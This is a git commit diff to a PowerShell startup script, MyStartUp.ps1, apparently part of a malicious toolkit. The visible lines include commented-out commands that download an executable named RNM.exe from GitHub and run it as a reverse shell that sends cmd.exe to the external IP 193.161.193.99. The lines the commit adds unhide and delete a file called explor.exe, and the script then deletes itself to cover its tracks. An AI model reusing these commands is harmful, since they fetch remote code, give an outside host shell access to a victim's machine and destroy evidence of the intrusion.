b237e9212606c9a4cfd6eeebc93a3a4509058416
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-24 02:08:30 -0500

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -7,6 +7,7 @@ C:\Users\seba\Downloads\lml.exe
 #taskkill /F /IM RNM.exe
 #Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\Users\Public\RNM.exe
 # Agregar el port C:\Users\Public\RNM.exe -nv 193.161.193.99 PORT -e cmd.exe
+attrib -h C:\Users\seba\Downloads\explor.exe
+del C:\Users\seba\Downloads\explor.exe
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
-
